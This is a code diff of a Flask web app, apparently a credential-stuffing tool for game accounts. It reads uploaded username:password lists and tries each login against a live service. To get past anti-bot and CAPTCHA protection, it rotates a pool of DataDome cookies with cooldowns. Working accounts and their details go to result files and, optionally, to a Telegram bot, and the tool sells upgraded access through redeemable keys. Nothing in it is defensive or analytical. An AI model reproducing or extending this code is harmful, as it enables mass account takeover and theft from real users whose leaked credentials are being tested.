@@ -1,5 +1,3 @@
-# --- START OF FILE app.py ---
-
 # --- START OF MODIFIED app.py ---
 
 import os
@@ -18,7 +16,7 @@ import subprocess
 import html
 import threading
 import queue
-from datetime import datetime, timedelta
+from datetime import datetime
 from urllib.parse import urlparse, parse_qs, urlencode
 from collections import OrderedDict
 
@@ -26,7 +24,6 @@ from collections import OrderedDict
 from flask import Flask, render_template, request, jsonify, redirect, url_for, send_from_directory, session, flash
 from werkzeug.utils import secure_filename
 from werkzeug.security import generate_password_hash, check_password_hash
-from functools import wraps
 
 # --- CONFIGURATION (MODIFIED FOR VERCEL) ---
 # Vercel has an ephemeral filesystem. All writes MUST go to the /tmp directory.
@@ -140,39 +137,6 @@ def init_admin_user():
 # Initialize admin user on startup
 init_admin_user()
 
-# --- Authentication and Status Decorator ---
-def login_required_and_update_status(f):
-    @wraps(f)
-    def decorated_function(*args, **kwargs):
-        if 'user' not in session:
-            # Handle both standard and AJAX requests
-            if request.headers.get('X-Requested-With') == 'XMLHttpRequest' or (request.accept_mimetypes.best_match(['application/json', 'text/html']) == 'application/json'):
-                return jsonify({'status': 'error', 'message': 'Authentication required.'}), 401
-            flash('Please log in to access this page.', 'warning')
-            return redirect(url_for('login'))
-
-        # Check for upgrade expiration
-        user = session['user']
-        if user.get('upgraded') and 'upgrade_expires_at' in user and user.get('upgrade_expires_at'):
-            try:
-                expiry_date = datetime.fromisoformat(user['upgrade_expires_at'])
-                if datetime.now() > expiry_date:
-                    # Upgrade has expired
-                    users_db = load_data(USERS_FILE)
-                    user_in_db = next((u for u in users_db if u['username'] == user['username']), None)
-                    if user_in_db:
-                        user_in_db['upgraded'] = False
-                        user_in_db.pop('upgrade_expires_at', None)
-                        save_data(users_db, USERS_FILE)
-                        session['user'] = user_in_db  # Update session
-                        session.modified = True
-                        flash('Your upgraded access has expired.', 'warning')
-            except (ValueError, TypeError):
-                pass
-        
-        return f(*args, **kwargs)
-    return decorated_function
-
 # --- Helper Functions (Adapted for Web App) ---
 
 def log_message(message, color_class='text-white'):
@@ -181,11 +145,12 @@ def log_message(message, color_class='text-white'):
     timestamp = datetime.now().strftime('%H:%M:%S')
     with status_lock:
         check_status['logs'].append({'timestamp': timestamp, 'message': clean_message, 'class': color_class})
-        # Limit log size to prevent memory issues
         if len(check_status['logs']) > 500:
             check_status['logs'].pop(0)
 
-def clear_screen(): pass # No-op for web UI
+def clear_screen():
+    pass
+
 def get_app_data_directory(): return APP_DATA_DIR
 def get_logs_directory(): return LOGS_BASE_DIR
 def get_results_directory(): return RESULTS_BASE_DIR
@@ -561,18 +526,17 @@ def clear_progress():
     if os.path.exists(PROGRESS_STATE_FILE):
         os.remove(PROGRESS_STATE_FILE)
 
-def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_cookie_module_name, use_cookie_set, auto_delete, force_restart, telegram_level_filter, checker_speed, fixed_cookie_number=0, user_info=None):
+# MODIFIED: Add user_info parameter
+def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_cookie_module_name, use_cookie_set, auto_delete, force_restart, telegram_level_filter, fixed_cookie_number=0, user_info=None):
     """The main background task for checking accounts."""
     global check_status, stop_event, captcha_pause_event
     
+    # WARNING: On Vercel, this task will be terminated after a short time (e.g., 60 seconds).
+    # It is not suitable for large account lists.
+    log_message("[⚠️ VERCEL NOTE] Checker is running on a serverless platform. Task will be terminated after the timeout limit.", "text-warning")
+
     is_complete = False
     try:
-        # MODIFIED: Updated delay map and logic
-        delay_map = {'fast': 0, 'medium': 1, 'slow': 2}
-        check_delay = delay_map.get(checker_speed, 0)
-        if check_delay > 0:
-            log_message(f"[⚙️] Checker speed set to '{checker_speed}'. A {check_delay}s delay will be applied after each check.", "text-info")
-            
         # --- Progress Handling ---
         if force_restart:
             clear_progress()
@@ -581,24 +545,27 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
         start_from_index = 0
         progress_data = load_progress()
         if progress_data and progress_data.get('source_file_path') == file_path:
-            start_from_index = progress_data.get('last_processed_index', 0) + 1
-       
-        if start_from_index > 0:
-            log_message(f"[🔄] RESUMING SESSION [🔄]", "text-success")
-            log_message(f"Found saved progress for this file. Starting from line {start_from_index + 1}.", "text-info")
-        else:
-            log_message(f"[▶️] Starting new session from the beginning.", "text-info")
+            start_from_index = progress_data.get('last_processed_index', -1) + 1
+            if start_from_index > 0:
+                log_message(f"[🔄] Resuming session from line {start_from_index + 1}.", "text-info")
 
         # Select cookie module based on name
         selected_cookie_module = getattr(sys.modules[__name__], selected_cookie_module_name)
 
+        # NEW: Set the fixed cookie number if provided
         if selected_cookie_module_name == 'set_cookie' and fixed_cookie_number > 0:
             set_cookie.set_fixed_number(fixed_cookie_number)
             log_message(f"[⚙️] Numbered Set is locked to use ONLY cookie #{fixed_cookie_number}.", "text-info")
 
-        stats = { 'successful': 0, 'failed': 0, 'clean': 0, 'not_clean': 0, 'incorrect_pass': 0, 'no_exist': 0, 'other_fail': 0, 'telegram_sent': 0, 'captcha_count': 0 }
+        stats = {
+            'successful': 0, 'failed': 0, 'clean': 0, 'not_clean': 0, 'incorrect_pass': 0,
+            'no_exist': 0, 'other_fail': 0, 'telegram_sent': 0, 'captcha_count': 0,
+            'level_distribution': {"1-50": 0, "51-100": 0, "101-200": 0, "201-300": 0, "301-400": 0, "No_CODM_Data": 0},
+            'country_counts': {},
+        }
         date = get_datenow()
         failed_file = os.path.join(get_logs_directory(), f"failed_{date}.txt")
+
         accounts, total_accounts = remove_duplicates_from_file(file_path)
         
         # --- USAGE LIMIT ---
@@ -619,8 +586,17 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
             cookie_state['pool'] = [c.get('datadome') for c in cookie_config.COOKIE_POOL if c.get('datadome')]
             log_message(f"[🍪] Loaded {len(cookie_state['pool'])} hardcoded DataDome cookies.", "text-info")
         else:
-            # Load from saved file
-            pass 
+            cookie_file = os.path.join(get_app_data_directory(), "datadome_cookies.json")
+            if os.path.exists(cookie_file):
+                try:
+                    with open(cookie_file, 'r') as f:
+                        loaded_cookies = json.load(f)
+                        if isinstance(loaded_cookies, list):
+                            cookie_state['pool'] = [c.get('datadome') for c in loaded_cookies if 'datadome' in c]
+                    log_message(f"[🍪] Loaded {len(cookie_state['pool'])} DataDome cookies from local pool.", "text-info")
+                except (json.JSONDecodeError, IOError):
+                    log_message("[⚠️] Could not load local cookie file. It might be corrupted.", "text-warning")
+            
         if not cookie_state['pool']:
             log_message("[⚠️] DataDome cookie pool is empty. Fetching new ones...", "text-warning")
             cookie_state['pool'] = fetch_new_datadome_pool()
@@ -644,69 +620,106 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                 username, password = acc.split(':', 1)
                 is_captcha_loop = True
                 while is_captcha_loop and not stop_event.is_set():
+                    
+                    # --- Upgraded Cookie Selection with Cooldown ---
                     current_datadome = None
                     if not cookie_state['pool']:
-                        stop_event.set(); break
+                        log_message("[❌] No cookies available in the pool. Stopping check.", "text-danger")
+                        stop_event.set()
+                        break
+                        
                     for _ in range(len(cookie_state['pool'])):
                         cookie_state['index'] = (cookie_state['index'] + 1) % len(cookie_state['pool'])
                         potential_cookie = cookie_state['pool'][cookie_state['index']]
+                        
                         cooldown_until = cookie_state['cooldown'].get(potential_cookie)
-                        if cooldown_until and time.time() < cooldown_until: continue 
-                        current_datadome = potential_cookie; break
-                    if not current_datadome:
-                        stop_event.set(); break
+                        if cooldown_until and time.time() < cooldown_until:
+                            continue 
+                        current_datadome = potential_cookie
+                        break
                     
+                    if not current_datadome:
+                        log_message("[❌] All available cookies are on cooldown. Please wait or add new cookies.", "text-danger")
+                        stop_event.set()
+                        break
+
                     log_message(f"[▶] Checking: {username}:{password} with cookie ...{current_datadome[-6:]}", "text-info")
                     result = check_account(username, password, date, current_datadome, selected_cookie_module)
 
                     if result == "[CAPTCHA]":
                         stats['captcha_count'] += 1
                         log_message(f"[🔴 CAPTCHA] Triggered by cookie ...{current_datadome[-6:]}", "text-danger")
+                        
                         expiry_time = time.time() + 300
                         cookie_state['cooldown'][current_datadome] = expiry_time
                         log_message(f"[⏳] Cookie placed on cooldown for 5 minutes.", "text-warning")
-                        with status_lock: check_status['captcha_detected'] = True
+
+                        with status_lock:
+                            check_status['captcha_detected'] = True
+                        
+                        time.sleep(random.uniform(2, 4))
+                        
                         captcha_pause_event.clear()
-                        captcha_pause_event.wait(timeout=30)
-                        with status_lock: check_status['captcha_detected'] = False
-                        if stop_event.is_set(): break
+                        captcha_pause_event.wait(timeout=30) # Add timeout to prevent hanging on Vercel
+                        
+                        with status_lock:
+                            check_status['captcha_detected'] = False
+                        
+                        if stop_event.is_set():
+                             break
+
                         log_message("[🔄] Resuming check for the same account...", "text-info")
                         continue
-                    else: is_captcha_loop = False
+
+                    else:
+                        is_captcha_loop = False
 
                 if stop_event.is_set(): break
                 
+                # Process result
                 if isinstance(result, tuple):
                     console_message, telegram_message, codm_level_num, country, user, pwd, shell, has_codm, is_clean, file_to_write, content_to_write = result
                     log_message(console_message, "text-success")
-                    stats['successful'] += 1; stats['clean' if is_clean else 'not_clean'] += 1
+                    stats['successful'] += 1
+                    if is_clean: stats['clean'] += 1
+                    else: stats['not_clean'] += 1
+                    
                     os.makedirs(os.path.dirname(file_to_write), exist_ok=True)
                     with open(file_to_write, "a", encoding="utf-8") as f: f.write(content_to_write)
+                    
+                    # --- NEW TELEGRAM LOGIC ---
                     if telegram_message and telegram_bot_token and telegram_chat_id and telegram_level_filter != 'none':
-                        send_notification = (telegram_level_filter == 'all') or (telegram_level_filter == '100+' and codm_level_num >= 100)
-                        if send_notification and send_to_telegram(telegram_bot_token, telegram_chat_id, telegram_message):
-                            log_message(f"[✅ TG] Notification sent for {user}.", "text-info"); stats['telegram_sent'] += 1
-                        elif send_notification: log_message(f"[❌ TG] Failed to send notification for {user}.", "text-danger")
+                        send_notification = False
+                        if telegram_level_filter == 'all':
+                            send_notification = True
+                        elif telegram_level_filter == '100+' and codm_level_num >= 100:
+                            send_notification = True
+                        
+                        if send_notification:
+                            if send_to_telegram(telegram_bot_token, telegram_chat_id, telegram_message):
+                                log_message(f"[✅ TG] Notification sent for {user}.", "text-info")
+                                stats['telegram_sent'] += 1
+                            else:
+                                log_message(f"[❌ TG] Failed to send notification for {user}.", "text-danger")
+
                 elif result:
                     stats['failed'] += 1
                     if "[🔐]" in result: stats['incorrect_pass'] += 1
                     elif "[😢]" in result: stats['no_exist'] += 1
                     else: stats['other_fail'] += 1
-                    with open(failed_file, 'a', encoding='utf-8') as failed_out: failed_out.write(f"{username}:{password} - {result}\n")
+                    with open(failed_file, 'a', encoding='utf-8') as failed_out:
+                        failed_out.write(f"{username}:{password} - {result}\n")
                     log_message(f"User: {username} | Pass: {password} ➔ {result}", "text-danger")
-            else: log_message(f"Invalid format: {acc} ➔ Skipping", "text-warning")
-            
-            with status_lock: check_status['stats'] = stats.copy()
-            
-            # Save progress checkpoint periodically
-            if original_index > 0 and original_index % 10 == 0:
-                save_progress(file_path, original_index)
-                log_message(f"Progress checkpoint saved at line {original_index + 1}...", "text-secondary")
 
-            # MODIFIED: Apply delay at the end of each account check
-            if check_delay > 0:
-                time.sleep(check_delay)
+            else:
+                log_message(f"Invalid format: {acc} ➔ Skipping", "text-warning")
+            
+            with status_lock:
+                check_status['stats'] = stats.copy()
+            
+            save_progress(file_path, original_index)
         
+        # --- Final Summary ---
         if not stop_event.is_set():
             is_complete = True
             with status_lock:
@@ -714,22 +727,32 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                 summary = ["--- CHECKING COMPLETE ---", f"Total: {total_accounts} | Success: {stats['successful']} | Failed: {stats['failed']}", "[VERCEL NOTE] All saved files are temporary and will be deleted."]
                 check_status['final_summary'] = "\n".join(summary)
             log_message("--- CHECKING COMPLETE ---", "text-success")
+            log_message("[VERCEL NOTE] All saved files are temporary and will be deleted.", "text-warning")
+
+
     except Exception as e:
         log_message(f"An unexpected error occurred in the checker task: {e}", "text-danger")
-        import traceback; log_message(traceback.format_exc(), "text-danger")
+        import traceback
+        log_message(traceback.format_exc(), "text-danger")
     finally:
         if is_complete:
             clear_progress()
             if auto_delete:
-                try: os.remove(file_path); log_message(f"Source file '{os.path.basename(file_path)}' has been deleted.", "text-info")
-                except OSError as e: log_message(f"Failed to delete source file: {e}", "text-danger")
-        with status_lock: check_status['running'] = False; save_progress(file_path, total_accounts) # Final save
+                try:
+                    os.remove(file_path)
+                    log_message(f"Source file '{os.path.basename(file_path)}' has been deleted from temporary storage.", "text-info")
+                except OSError as e:
+                    log_message(f"Failed to delete source file: {e}", "text-danger")
+        with status_lock:
+            check_status['running'] = False
 
 # --- Flask Routes ---
 
 @app.route('/')
-@login_required_and_update_status
 def index():
+    if 'user' not in session:
+        return redirect(url_for('login'))
+        
     log_message(f"Welcome, {session['user']['username']}! The app is ready.", "text-info")
     bot_token, chat_id = load_telegram_config()
     return render_template('index.html', bot_token=bot_token or '', chat_id=chat_id or '', user=session['user'])
@@ -748,21 +771,39 @@ def login():
             return redirect(url_for('index'))
         else:
             flash('Invalid username or password.', 'danger')
+            
     return render_template('login.html')
 
 @app.route('/register', methods=['GET', 'POST'])
 def register():
     if request.method == 'POST':
-        username = request.form['username']; email = request.form['email']
-        password = request.form['password']; confirm_password = request.form['confirm_password']
+        username = request.form['username']
+        email = request.form['email']
+        password = request.form['password']
+        confirm_password = request.form['confirm_password']
+        
         if password != confirm_password:
-            flash('Passwords do not match.', 'danger'); return redirect(url_for('register'))
+            flash('Passwords do not match.', 'danger')
+            return redirect(url_for('register'))
+            
         users = load_data(USERS_FILE)
         if any(u['username'] == username for u in users):
-            flash('Username already exists.', 'danger'); return redirect(url_for('register'))
-        new_user = { "username": username, "password_hash": generate_password_hash(password), "email": email, "upgraded": False, "registered_at": datetime.now().isoformat() }
-        users.append(new_user); save_data(users, USERS_FILE)
-        flash('Registration successful! Please log in.', 'success'); return redirect(url_for('login'))
+            flash('Username already exists.', 'danger')
+            return redirect(url_for('register'))
+
+        new_user = {
+            "username": username,
+            "password_hash": generate_password_hash(password),
+            "email": email,
+            "upgraded": False,
+            "registered_at": datetime.now().isoformat()
+        }
+        users.append(new_user)
+        save_data(users, USERS_FILE)
+        
+        flash('Registration successful! Please log in.', 'success')
+        return redirect(url_for('login'))
+        
     return render_template('register.html')
 
 @app.route('/logout')
@@ -773,18 +814,27 @@ def logout():
 
 
 @app.route('/start_check', methods=['POST'])
-@login_required_and_update_status
 def start_check():
+    if 'user' not in session:
+        return jsonify({'status': 'error', 'message': 'Authentication required.'}), 401
+
     global check_status, stop_event, captcha_pause_event
+    
     with status_lock:
         if check_status['running']:
             return jsonify({'status': 'error', 'message': 'A check is already running.'}), 400
-        check_status = { 'running': True, 'progress': 0, 'total': 0, 'logs': [], 'stats': {}, 'final_summary': None, 'captcha_detected': False, 'stop_requested': False, 'current_account': '' }
-        stop_event.clear(); captcha_pause_event.clear()
+
+        check_status = {
+            'running': True, 'progress': 0, 'total': 0, 'logs': [], 'stats': {},
+            'final_summary': None, 'captcha_detected': False, 'stop_requested': False, 'current_account': ''
+        }
+        stop_event.clear()
+        captcha_pause_event.clear()
 
     file = request.files.get('account_file')
     if not file or file.filename == '':
-        flash('No account file selected.', 'danger'); return redirect(url_for('index'))
+        flash('No account file selected.', 'danger')
+        return redirect(url_for('index'))
     
     filename = secure_filename(file.filename)
     file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
@@ -792,119 +842,157 @@ def start_check():
 
     bot_token = request.form.get('telegram_bot_token')
     chat_id = request.form.get('telegram_chat_id')
-    if request.form.get('save_telegram_creds'): save_telegram_config(bot_token, chat_id)
+    save_creds = request.form.get('save_telegram_creds')
+    
+    if save_creds and bot_token and chat_id:
+        save_telegram_config(bot_token, chat_id)
+
     cookie_module = request.form.get('cookie_module', 'ken_cookie')
     cookie_number = request.form.get('cookie_number', type=int, default=0)
-    use_cookie_set = 'use_cookie_set' in request.form; auto_delete = 'auto_delete' in request.form
+    
+    use_cookie_set = 'use_cookie_set' in request.form
+    auto_delete = 'auto_delete' in request.form
     force_restart = 'force_restart' in request.form
     telegram_level_filter = request.form.get('telegram_level_filter', 'none')
-    # MODIFIED: Default checker speed is now 'fast'
-    checker_speed = request.form.get('checker_speed', 'fast')
 
     log_message("Starting new check...", "text-info")
-    thread = threading.Thread(target=run_check_task, args=(file_path, bot_token, chat_id, cookie_module, use_cookie_set, auto_delete, force_restart, telegram_level_filter, checker_speed, cookie_number, session['user']))
-    thread.daemon = True; thread.start()
+    thread = threading.Thread(target=run_check_task, args=(
+        file_path, bot_token, chat_id, cookie_module, use_cookie_set, 
+        auto_delete, force_restart, telegram_level_filter, cookie_number, session['user']
+    ))
+    thread.daemon = True
+    thread.start()
+
     return redirect(url_for('index'))
 
 @app.route('/status')
-@login_required_and_update_status
 def get_status():
-    with status_lock: return jsonify(check_status)
+    if 'user' not in session:
+        return jsonify({'status': 'error', 'message': 'Authentication required.'}), 401
+    with status_lock:
+        return jsonify(check_status)
 
 def trigger_stop():
     with status_lock:
-        if not check_status['running']: return
+        if not check_status['running']:
+            return
         check_status['stop_requested'] = True
     stop_event.set()
-    if not captcha_pause_event.is_set(): captcha_pause_event.set()
+    if not captcha_pause_event.is_set():
+         captcha_pause_event.set()
     log_message("Stop request received. Shutting down gracefully...", "text-warning")
 
 @app.route('/stop_check', methods=['POST'])
-@login_required_and_update_status
 def stop_check_route():
+    if 'user' not in session: return jsonify({'status': 'error', 'message': 'Authentication required.'}), 401
     trigger_stop()
     return jsonify({'status': 'success', 'message': 'Stop signal sent.'})
 
 @app.route('/captcha_action', methods=['POST'])
-@login_required_and_update_status
 def captcha_action():
+    if 'user' not in session: return jsonify({'status': 'error', 'message': 'Authentication required.'}), 401
     action = request.form.get('action')
     log_message(f"Captcha action received: {action}", "text-info")
+
     if action == 'fetch_pool':
         new_pool = fetch_new_datadome_pool(num_cookies=5)
         if new_pool:
+            log_message(f"Fetched {len(new_pool)} cookies. They will be saved for this session.", "text-info")
             for c in new_pool: save_datadome_cookie(c)
-    elif action == 'stop_checker': trigger_stop()
+    elif action == 'retry_ip':
+        log_message("[IP] Assuming IP has been changed. Retrying...", "text-info")
+    elif action == 'stop_checker':
+        trigger_stop()
+        captcha_pause_event.set()
+        return jsonify({'status': 'success', 'message': 'Stop signal sent.'})
+    elif action == 'next_cookie':
+        log_message("[🔄] Attempting to use next available cookie.", "text-info")
     
     captcha_pause_event.set()
     return jsonify({'status': 'success', 'message': 'Action processed.'})
 
-@app.route('/redeem_key', methods=['POST'])
-@login_required_and_update_status
+@app.route('/redeem', methods=['POST'])
 def redeem_key():
+    if 'user' not in session:
+        return jsonify({'status': 'error', 'message': 'Authentication required.'}), 401
+    
     key_to_redeem = request.form.get('key')
     keys = load_data(KEYS_FILE)
     users = load_data(USERS_FILE)
+    
     key_found = next((k for k in keys if k['key'] == key_to_redeem), None)
     
     if key_found and not key_found['redeemed_by']:
         key_found['redeemed_by'] = session['user']['username']
         key_found['redeemed_at'] = datetime.now().isoformat()
+        
         current_user = next((u for u in users if u['username'] == session['user']['username']), None)
         if current_user:
             current_user['upgraded'] = True
-            duration_days = key_found.get('duration_days')
-            if duration_days and isinstance(duration_days, int) and duration_days > 0:
-                expiry_date = datetime.now() + timedelta(days=duration_days)
-                current_user['upgrade_expires_at'] = expiry_date.isoformat()
-                flash(f'Key redeemed! Account upgraded for {duration_days} days.', 'success')
-            else:
-                current_user.pop('upgrade_expires_at', None) # Remove expiry for permanent keys
-                flash('Key redeemed! Account permanently upgraded.', 'success')
-            session['user'] = current_user # Update session with new status and expiry
+            session['user'] = current_user
             session.modified = True
-            save_data(keys, KEYS_FILE); save_data(users, USERS_FILE)
+        
+        save_data(keys, KEYS_FILE)
+        save_data(users, USERS_FILE)
+        flash('Key redeemed successfully! Your account has been upgraded.', 'success')
     else:
         flash('Invalid or already used key.', 'danger')
+        
     return redirect(url_for('index'))
 
 # --- Admin Routes ---
 @app.route('/admin/generate_key', methods=['POST'])
-@login_required_and_update_status
 def generate_key():
     if session.get('user', {}).get('username') != 'admin':
         return jsonify({"status": "error", "message": "Unauthorized"}), 403
-    try:
-        duration_days = int(request.form.get('duration_days', 0))
-    except (ValueError, TypeError):
-        return jsonify({"status": "error", "message": "Invalid duration. Please provide a whole number."}), 400
-
+    
     keys = load_data(KEYS_FILE)
     new_key_val = f"GCHK-{uuid.uuid4().hex[:12].upper()}"
-    new_key = { "key": new_key_val, "duration_days": duration_days, "generated_by": "admin", "generated_at": datetime.now().isoformat(), "redeemed_by": None, "redeemed_at": None }
+    new_key = {
+        "key": new_key_val,
+        "generated_by": "admin",
+        "generated_at": datetime.now().isoformat(),
+        "redeemed_by": None,
+        "redeemed_at": None
+    }
     keys.append(new_key)
     save_data(keys, KEYS_FILE)
+    
     return jsonify({"status": "success", "key": new_key_val})
 
 @app.route('/admin/data', methods=['GET'])
-@login_required_and_update_status
 def get_admin_data():
     if session.get('user', {}).get('username') != 'admin':
         return jsonify({"status": "error", "message": "Unauthorized"}), 403
+    
     users = load_data(USERS_FILE)
     keys = load_data(KEYS_FILE)
+    
+    # Don't send password hashes to the client
     safe_users = [{k: v for k, v in u.items() if k != 'password_hash'} for u in users]
-    return jsonify({ "users": sorted(safe_users, key=lambda x: x['registered_at'], reverse=True), "keys": sorted(keys, key=lambda x: x['generated_at'], reverse=True) })
+    
+    return jsonify({
+        "users": sorted(safe_users, key=lambda x: x['registered_at'], reverse=True),
+        "keys": sorted(keys, key=lambda x: x['generated_at'], reverse=True)
+    })
 
 @app.route('/results/<path:filename>')
-@login_required_and_update_status
 def download_file(filename):
+    if 'user' not in session:
+        return redirect(url_for('login'))
+        
     results_dir = get_results_directory()
-    file_path = os.path.join(results_dir, filename)
-    if not os.path.exists(file_path):
-        flash(f"File not found: {filename}. It may have been cleared from the server's temporary storage.", "danger")
-        return redirect(url_for('index'))
+    log_message(f"Attempting to download from: {results_dir}/{filename}", "text-info")
+    if not os.path.exists(os.path.join(results_dir, filename)):
+        log_message(f"File not found. It may have been deleted by Vercel's ephemeral filesystem.", "text-danger")
+        return "File not found. It may have been cleared from the server's temporary storage.", 404
     return send_from_directory(results_dir, filename, as_attachment=True)
 
+
+# The following block is not used by Vercel, but is good practice to keep
 if __name__ == '__main__':
+    # This block is for local development only.
+    # Vercel uses a production WSGI server (like Gunicorn) and calls the `app` object directly.
+    print("Starting Flask server for local development...")
+    print("Access the interface at http://127.0.0.1:5000")
     app.run(host='127.0.0.1', port=5000, debug=True)
